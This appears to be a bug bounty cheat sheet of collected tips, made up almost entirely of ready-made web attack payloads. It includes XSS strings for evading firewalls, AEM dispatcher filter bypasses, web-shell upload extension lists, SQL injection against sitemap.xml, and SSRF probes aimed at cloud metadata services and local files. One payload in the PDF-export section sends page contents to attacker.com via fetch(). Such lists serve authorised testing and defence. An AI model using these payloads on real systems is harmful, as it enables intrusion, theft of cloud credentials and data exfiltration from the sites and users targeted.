# Twitter Tips — Part 2

## WAF XSS bypass

When a WAF blocks classic `<script>` payloads, try these alternatives:

```html
<!-- Avoid <script>, use <svg> -->
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Use exotic event handlers -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- HTML entity encoding -->
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

<!-- Mix case -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Use template literals -->
<img src=x onerror=`alert(1)`>

<!-- Bypass via JS comments -->
<svg/onload="/*''*/alert(1)">

<!-- Bypass keyword filters -->
<svg/onload="al\u0065rt(1)">
<svg/onload="window['ale'+'rt'](1)">
```

## AEM filter bypass

When AEM dispatcher blocks `*.json`, try these tricks:

```
/path.json/a.css
/path.json;.css
/path.json%20.css
/path.json#.css
/path.json?.css
/path.JSON
/path.1.json
/path.1.2.json
```

## File-extension upload tests

When an upload endpoint blocks `.php`, try every variation of dangerous extensions:

```
shell.phtml
shell.phar
shell.phps
shell.pht
shell.php3
shell.php4
shell.php5
shell.php7
shell.PhP
shell.PHP
shell.pHp7
shell.inc
shell.module
```

For ASP / ASPX:

```
shell.aspx
shell.asp
shell.cer
shell.asa
shell.ashx
shell.asmx
shell.cshtml
```

For JSP:

```
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
```

## SQL injection in `sitemap.xml`

`sitemap.xml` is often dynamically generated from a database query. Inject SQLi payloads through any URL parameter that influences sitemap generation:

```
GET /sitemap.xml?id=1' OR '1'='1
GET /sitemap.xml?lang=en' UNION SELECT NULL,NULL,NULL --
GET /sitemap.xml?category=1; SELECT pg_sleep(5) --
```

Also test:

```
/sitemap_index.xml
/post-sitemap.xml
/page-sitemap.xml
/category-sitemap.xml
/product-sitemap.xml
```

## SSRF via PDF generation

Many SaaS products offer "export to PDF". They run a headless browser server-side that fetches resources from URLs you control:

```html
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">
<link rel="stylesheet" href="http://localhost:6379/">
<object data="file:///etc/passwd">

<!-- Same trick with images for export-to-image features -->
<img src="x" onerror="fetch('http://attacker.com/'+btoa(document.documentElement.innerHTML))">
```

## Blind SSRF via webhook URLs

When the application accepts a webhook URL, try:

```
http://169.254.169.254/latest/meta-data/                  (AWS)
http://metadata.google.internal/computeMetadata/v1/        (GCP — needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2019-06-01  (Azure — needs Metadata: true)
http://localhost:80/                                       (loopback)
http://127.0.0.1:8080/admin                                (internal admin)
http://[::]:80/                                            (IPv6 loopback)
http://0.0.0.0/                                            (any)
```

## Cache deception via static-extension trick

Append a static extension to a sensitive endpoint and observe whether the response is cached:

```
GET /account/profile.css
GET /account/profile.js
GET /account/profile/test.css
GET /account/api-key.png
```

If the cache (CloudFront / Akamai / Varnish) caches the response based on extension, sensitive data can leak to other users.

## Bug bounty mindset

> Read the developer's mind. What corner of the application looks like an afterthought? That's where the bugs hide.

> Always question the most obvious assumption. The "clearly correct" parameter is the one that's never validated.

> Don't stop at the first finding. Chain it. Low + Low + Low = Critical.

> Document everything. The note you take today is the chain you remember tomorrow.
